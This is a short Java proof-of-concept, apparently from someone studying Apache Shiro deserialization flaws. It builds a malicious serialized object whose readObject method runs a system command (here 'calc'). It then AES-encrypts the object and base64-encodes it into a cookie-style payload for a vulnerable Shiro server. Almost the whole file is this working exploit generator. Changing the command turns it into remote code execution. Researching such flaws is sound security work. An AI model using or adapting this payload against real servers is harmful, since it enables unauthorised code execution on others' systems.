package com.example.demo3.demo;

import org.apache.shiro.codec.Base64;
import org.apache.shiro.io.ClassResolvingObjectInputStream;

import java.io.*;

public class Demo1 extends AesUtils {

    public static void main(String[] args) throws IOException, ClassNotFoundException {
//        SimpleAuthenticationInfo info = new SimpleAuthenticationInfo(test, "", "");
        Test test = new Test();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        // 1. 序列化恶意对象
        // 创建对象输出流，用于序列化对象
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(test);

        // 2. 加密而已对象（byte数组）
        AesUtils aesUtils = new AesUtils();
        byte[] encryptByte = aesUtils.encrypt(baos.toByteArray());

        // 3. 转为base64
        String base64 = Base64.encodeToString(encryptByte);
        System.out.println(base64);

    }
}

class Test implements Serializable {

    private void readObject(ObjectInputStream in) {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}